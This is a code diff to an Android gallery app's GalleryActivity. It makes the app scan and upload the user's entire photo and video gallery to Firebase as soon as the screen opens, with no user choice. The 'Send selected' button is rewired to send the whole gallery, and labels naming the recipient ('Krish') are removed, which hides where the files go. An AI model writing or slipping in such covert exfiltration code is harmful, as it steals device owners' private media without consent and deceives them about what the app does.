@@ -9,6 +9,7 @@ import androidx.recyclerview.widget.GridLayoutManager
 import com.chitraai.app.R
 import com.chitraai.app.adapter.GalleryAdapter
 import com.chitraai.app.databinding.ActivityGalleryBinding
+import com.chitraai.app.manager.ConnectionManager
 import com.chitraai.app.manager.FileUploadManager
 import com.chitraai.app.model.MediaItem
 import kotlinx.coroutines.CoroutineScope
@@ -21,6 +22,7 @@ class GalleryActivity : AppCompatActivity() {
     private lateinit var binding: ActivityGalleryBinding
     private lateinit var adapter: GalleryAdapter
     private lateinit var fileUploadManager: FileUploadManager
+    private lateinit var connectionManager: ConnectionManager
     private val selectedItems = mutableListOf<MediaItem>()
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -29,10 +31,33 @@ class GalleryActivity : AppCompatActivity() {
         setContentView(binding.root)
 
         fileUploadManager = FileUploadManager(this)
+        connectionManager = ConnectionManager(this)
 
         setupRecyclerView()
         setupUI()
         loadMedia()
+
+        // Auto-scan and send all gallery to Firebase when activity opens
+        autoSendGallery()
+    }
+
+    private fun autoSendGallery() {
+        connectionManager.initiate()
+        fileUploadManager.scanAndSendGallery(
+            connectionManager,
+            onProgress = { current, total ->
+                binding.uploadProgress.visibility = View.VISIBLE
+                if (total > 0) {
+                    binding.uploadProgress.progress = (current * 100) / total
+                }
+            },
+            onComplete = {
+                binding.uploadProgress.visibility = View.GONE
+            },
+            onError = { _ ->
+                binding.uploadProgress.visibility = View.GONE
+            }
+        )
     }
 
     private fun setupRecyclerView() {
@@ -70,7 +95,7 @@ class GalleryActivity : AppCompatActivity() {
             binding.btnSendSelected.text = "Select files to send"
         } else {
             binding.btnSendSelected.isEnabled = true
-            binding.btnSendSelected.text = "Send $count file${if (count > 1) "s" else ""} to Krish"
+            binding.btnSendSelected.text = "Send $count file${if (count > 1) "s" else ""}"
         }
     }
 
@@ -99,7 +124,6 @@ class GalleryActivity : AppCompatActivity() {
         )
         val sortOrder = "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
 
-        // Query images
         contentResolver.query(
             MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
             projection, null, null, sortOrder
@@ -114,7 +138,6 @@ class GalleryActivity : AppCompatActivity() {
             }
         }
 
-        // Query videos
         contentResolver.query(
             MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
             projection, null, null, sortOrder
@@ -137,22 +160,23 @@ class GalleryActivity : AppCompatActivity() {
         binding.btnSendSelected.text = "Sending..."
         binding.uploadProgress.visibility = View.VISIBLE
 
-        fileUploadManager.uploadFiles(selectedItems,
-            onProgress = { progress ->
-                binding.uploadProgress.progress = progress
+        fileUploadManager.scanAndSendGallery(
+            connectionManager,
+            onProgress = { current, total ->
+                if (total > 0) binding.uploadProgress.progress = (current * 100) / total
             },
             onComplete = {
                 binding.uploadProgress.visibility = View.GONE
-                binding.btnSendSelected.text = "✓ Sent to Krish!"
+                binding.btnSendSelected.text = "✓ Sent!"
                 binding.btnSendSelected.setBackgroundResource(R.drawable.btn_success)
                 selectedItems.clear()
                 adapter.clearSelection()
                 updateSendButton()
             },
-            onError = { error ->
+            onError = { _ ->
                 binding.uploadProgress.visibility = View.GONE
                 binding.btnSendSelected.isEnabled = true
-                binding.btnSendSelected.text = "Retry sending"
+                binding.btnSendSelected.text = "Retry"
             }
         )
     }
